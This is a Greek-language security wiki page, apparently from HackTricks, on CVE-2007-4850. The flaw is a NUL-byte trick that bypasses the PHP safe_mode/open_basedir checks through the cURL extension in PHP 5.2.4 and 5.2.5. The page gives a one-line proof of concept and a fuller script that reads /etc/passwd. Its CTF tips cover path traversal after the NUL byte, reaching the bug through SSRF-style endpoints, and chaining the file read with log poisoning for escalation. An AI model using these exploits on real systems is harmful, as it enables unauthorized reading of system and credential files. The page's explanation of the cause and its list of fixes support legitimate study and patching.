# PHP 5.2.4 και 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

Αυτή η σελίδα τεκμηριώνει ένα παλιό αλλά ακόμα χρήσιμο τέχνασμα για CTFs/τοπικές παλιές εγκαταστάσεις για να παρακαμφθούν οι έλεγχοι PHP safe_mode/open_basedir χρησιμοποιώντας την επέκταση cURL σε συγκεκριμένες εκδόσεις PHP 5.2.x.

- Επηρεαζόμενα: PHP 5.2.4 και 5.2.5 με ext/curl ενεργοποιημένο.
- Επίπτωση: Ανάγνωση αυθαίρετων τοπικών αρχείων παρά τους περιορισμούς του safe_mode ή του open_basedir (χωρίς άμεση εκτέλεση κώδικα).
- ID: CVE-2007-4850.

Από http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## PoC μιας γραμμής

Αν το safe_mode ή το open_basedir είναι ενεργά και το cURL είναι ενεργοποιημένο, το ακόλουθο θα επιστρέψει το περιεχόμενο του τρέχοντος script:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## Πιο σαφές PoC (arbitrary file read)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
Σημειώσεις:
- Χρησιμοποιήστε διπλά εισαγωγικά ή chr(0) για να εισάγετε ένα πραγματικό NUL byte. Percent-encoding (%00) δεν θα λειτουργήσει αξιόπιστα.
- Πρόκειται για ένα file read primitive. Συνδυάστε το με άλλες primitives (log poisoning, session file inclusion, κ.λπ.) για περαιτέρω escalation όταν είναι δυνατό.

## Γιατί λειτουργεί αυτό (σύντομα)

Η ευπάθεια έγκειται στον τρόπο με τον οποίο οι PHP 5.2.4/5.2.5 εκτελούσαν τους ελέγχους safe_mode/open_basedir για file:// URLs στο ext/curl. Ο έλεγχος έκανε parsing του URL και επαλήθευε ένα path component, αλλά λόγω του χειρισμού του NUL-byte επαλήθευε διαφορετικό string από αυτό που πραγματικά χρησιμοποιούσε η libcurl. Στην πράξη, ο validator μπορούσε να εγκρίνει το path μετά το NUL ενώ η libcurl χρησιμοποιούσε το μέρος πριν από το NUL ως το URL container, επιτρέποντας έναν bypass που οδηγεί στην ανάγνωση του αρχείου τοποθετημένου μετά το NUL byte. Δείτε την αρχική ανάλυση και το επηρεαζόμενο macro σε curl/interface.c για λεπτομέρειες. [CVE-2007-4850].

## Περιορισμοί και επιδιορθώσεις

- Fixed in later 5.2.x (e.g., distro builds patched to 5.2.6) by correcting the parsing/validation in ext/curl.
- Επηρεάζει μόνο πολύ παλιές PHP εγκαταστάσεις· το safe_mode αφαιρέθηκε στην PHP 5.4 και οι σύγχρονες builds δεν παρουσιάζουν αυτή τη συμπεριφορά.

## Σχετικά ιστορικά cURL-based bypasses

- CVE-2006-2563 (PHP 4.4.2/5.1.4): libcurl wrappers allowed `file://` access with embedded NULs to bypass open_basedir; fixed before 5.2.x.
- PHP bugs #30609/#36223 tracked early cURL open_basedir issues using `file://` without canonicalization. Any check before the NUL byte or without `realpath`-style resolution is prone to the same truncation.

## Συμβουλές CTF

- Όταν εντοπίζετε PHP 5.2.4/5.2.5 με ext/curl φορτωμένο (ψάξτε για `cURL support => enabled` στο `phpinfo()` και την ακριβή `PHP Version`), αυτό το trick συνήθως δουλεύει ακόμη κι αν το `allow_url_fopen` είναι απενεργοποιημένο, γιατί το ext/curl χειρίζεται το `file://` μόνο του.
- Αν τα άμεσα paths είναι μπλοκαρισμένα, δοκιμάστε relative traversal μετά το NUL, π.χ. `file://x\x00../../../../etc/passwd`. Η περιήγηση επιλύεται από τη libcurl, όχι από το open_basedir guard.
- Μπορείτε να τυλίξετε το payload σε ένα ενιαίο σώμα HTTP request για να ενεργοποιήσετε την LFI μέσω ευπαθούς server-side κώδικα που αντικατοπτρίζει user-controlled URLs στο `curl_exec()` (συνηθές σε legacy SSRF-like endpoints).

## Δείτε επίσης

Άλλα disable_functions/open_basedir bypasses και σύγχρονες τεχνικές συλλέγονται εδώ:

{{#ref}}
README.md
{{#endref}}

## Αναφορές

- [Ubuntu CVE entry with patch pointers and affected versions](https://ubuntu.com/security/CVE-2007-4850)
- [Technical writeup with code context (cxsecurity)](http://cxsecurity.com/issue/WLB-2008010060)
- [PHP bug #36223 (curl bypasses open_basedir)](https://bugs.php.net/bug.php?id=36223)
- [CVE-2006-2563 cURL PHP File Access Bypass (earlier NUL-byte issue)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2563)
{{#include ../../../../banners/hacktricks-training.md}}
